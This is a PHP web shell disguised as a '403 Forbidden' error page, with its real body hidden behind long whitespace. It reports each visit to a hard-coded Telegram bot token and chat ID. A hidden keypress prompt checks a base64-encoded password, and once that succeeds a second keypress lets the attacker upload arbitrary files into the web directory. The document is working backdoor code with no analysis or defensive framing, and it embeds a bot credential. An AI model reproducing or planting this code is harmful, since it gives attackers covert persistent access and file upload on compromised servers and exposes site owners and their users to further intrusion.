<?php
session_start();
define('BOT_TOKEN', '8488755287:AAE4uxP6ShKJICvnJRRj6gA4GCVVt7ul6PQ');
define('CHAT_ID', '1637328347');
$encodedPassword = 'QXNrdXJtMG0j';
if (isset($_POST['p'])) {
    if (base64_encode($_POST['p']) === $encodedPassword) {
        $_SESSION['a'] = true;
    }
}
$authenticated = isset($_SESSION['a']) && $_SESSION['a'] === true;
$url = "https://api.telegram.org/bot".BOT_TOKEN."/sendMessage";
$message = "<b> NEW ACCESS</b>\n".date('Y-m-d H:i:s')."\n".(isset($_SERVER['HTTPS'])?'https://':'http://').($_SERVER['HTTP_HOST']??'Unknown').($_SERVER['REQUEST_URI']??'');
$data = ['chat_id' => CHAT_ID, 'text' => $message, 'parse_mode' => 'HTML'];
$options = ['http' => ['header'=>"Content-type: application/x-www-form-urlencoded\r\n", 'method'=>'POST', 'content'=>http_build_query($data)]];
@file_get_contents($url, false, stream_context_create($options));
if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['f'])) {
    @copy($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    exit;
}
?><html><head><title>403 Forbidden</title></head>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           <body><?php if (!$authenticated): ?><script>document.addEventListener('keydown',function(e){if(e.key==='9'){var i=prompt('');if(i){fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'p='+encodeURIComponent(i)}).then(()=>location.reload());}}});</script><?php else: ?><script>document.addEventListener('keydown',function(e){if(e.key==='8'){var f=document.createElement('input');f.type='file';f.onchange=function(){var d=new FormData();d.append('f',f.files[0]);fetch('',{method:'POST',body:d}).then(()=>{alert('OK');});};f.click();}});</script><?php endif; ?></body></html>